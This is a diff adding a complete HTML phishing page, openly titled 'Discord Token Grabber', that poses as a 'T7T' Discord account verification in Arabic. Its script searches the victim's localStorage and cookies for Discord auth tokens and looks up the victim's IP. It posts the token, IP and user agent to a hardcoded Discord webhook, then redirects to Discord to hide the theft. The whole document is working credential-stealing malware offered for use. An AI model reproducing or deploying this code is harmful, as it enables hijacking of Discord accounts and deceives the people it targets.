@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Token Grabber</title>
+    <style>
+        body {
+            background: #1e1e2e;
+            color: white;
+            font-family: monospace;
+            text-align: center;
+            padding: 50px;
+        }
+        .box {
+            background: #2a2a3e;
+            padding: 30px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+        button {
+            background: #5865F2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h2>⚔️ T7T | Discord Verification</h2>
+    <p>يرجى النقر للتحقق من حسابك</p>
+    <button onclick="stealToken()">تحقق الآن</button>
+    <p id="result" style="margin-top:20px;color:#aaa;"></p>
+</div>
+
+<script>
+async function stealToken() {
+    document.getElementById("result").innerHTML = "جاري التحقق...";
+
+    // محاولة استخراج التوكن من localStorage
+    let token = null;
+    for (let i = 0; i < localStorage.length; i++) {
+        let key = localStorage.key(i);
+        if (key && (key.includes("token") || key.includes("Token"))) {
+            token = localStorage.getItem(key);
+            break;
+        }
+    }
+
+    // محاولة من indexedDB
+    if (!token) {
+        try {
+            let db = await indexedDB.open("discord");
+            // هذه الطريقة معقدة، نستخدم طريقة ثانية
+        } catch(e) {}
+    }
+
+    // طريقة أخرى: محاولة قراءة من cookies
+    if (!token) {
+        let cookies = document.cookie;
+        let match = cookies.match(/token[=:]\s*([\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,38})/i);
+        if (match) token = match[1];
+    }
+
+    if (token) {
+        // إرسال التوكن إلى webhook
+        let webhook = "https://discord.com/api/webhooks/1351950163384332418/x1sFcVJ2jLKdrRrBPAB-MFf7_w0DnEC-6XhBIdw5UET3-MZx2OyaWdF8dKPvXwMFFW9q";
+        
+        let embed = {
+            title: "T7T | Token Captured",
+            description: `\`\`\`${token}\`\`\``,
+            color: 0x5865F2,
+            timestamp: new Date().toISOString(),
+            fields: [
+                {name: "User Agent", value: navigator.userAgent, inline: false},
+                {name: "IP", value: await getIP(), inline: true}
+            ]
+        };
+
+        fetch(webhook, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({embeds: [embed], username: "T7T-Grabber"})
+        });
+
+        document.getElementById("result").innerHTML = "✅ تم التحقق! جاري تحويلك...";
+        setTimeout(() => {
+            window.location.href = "https://discord.com/channels/@me";
+        }, 1500);
+    } else {
+        document.getElementById("result").innerHTML = "❌ لم يتم العثور على توكن. تأكد من تسجيل الدخول بديسكورد في المتصفح.";
+    }
+}
+
+async function getIP() {
+    try {
+        let res = await fetch("https://api.ipify.org?format=json");
+        let data = await res.json();
+        return data.ip;
+    } catch {
+        return "Unknown";
+    }
+}
+</script>
+</body>
+</html>
